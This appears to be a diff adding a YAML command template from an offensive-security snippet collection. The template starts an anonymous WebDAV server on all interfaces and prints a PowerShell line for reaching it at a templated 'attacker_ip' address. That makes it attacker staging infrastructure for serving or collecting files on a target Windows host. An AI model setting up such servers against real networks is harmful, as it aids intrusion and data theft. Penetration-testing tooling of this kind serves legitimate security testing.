@@ -1,0 +1,13 @@
+metadata:
+  filename: "webdav-initial.yaml"
+  tags: ["web"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  mkdir -p webdav ;\
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'To access: Set-Location \\\\<%=$(esh variables/attacker_ip)%>@<%=$(esh variables/webdav_port)%>; explorer .'; \
+  echo '================================================================'; \
+  wsgidav --host=0.0.0.0 --port=<%=$(esh variables/webdav_port)%> --auth=anonymous --root webdav
